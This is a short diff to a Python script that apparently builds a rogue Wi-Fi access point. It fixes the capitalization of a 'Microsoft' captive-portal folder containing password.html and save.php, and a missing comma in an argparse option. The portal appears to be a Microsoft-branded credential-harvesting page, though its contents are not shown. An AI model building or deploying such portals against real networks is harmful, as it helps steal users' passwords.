@@ -188,9 +188,9 @@ def setup_captive_portal_files(Cap: str):
             shutil.copy("index.html", os.path.join(portal_dir, "index.html"))
             shutil.copy("save.php", os.path.join(portal_dir, "save.php"))
         if Cap == "microsoft": 
-            shutil.copy("microsoft/index.html", os.path.join(portal_dir, "index.html"))
-            shutil.copy("microsoft/password.html", os.path.join(portal_dir, "password.html"))
-            shutil.copy("microsoft/save.php", os.path.join(portal_dir, "save.php"))
+            shutil.copy("Microsoft/index.html", os.path.join(portal_dir, "index.html"))
+            shutil.copy("Microsoft/password.html", os.path.join(portal_dir, "password.html"))
+            shutil.copy("Microsoft/save.php", os.path.join(portal_dir, "save.php"))
         
         print("[+] Captive portal files copied successfully.")
     except Exception as e:
@@ -398,7 +398,7 @@ def main():
     parser.add_argument('--channel', required=True, type=int, help="Channel for the network")
     parser.add_argument('--network', required=True, help="Network address in CIDR format ( 192.168.50.0/24)")
     parser.add_argument("--band", dest="band", required=True, choices=["2.4", "5"], help="Choose WiFi band: 2.4GHz or 5GHz")
-    parser.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft"], default="default" help="Choose Your Captive Portal")
+    parser.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft"], default="default", help="Choose Your Captive Portal")
     script_args = parser.parse_args()
 
     check_root()
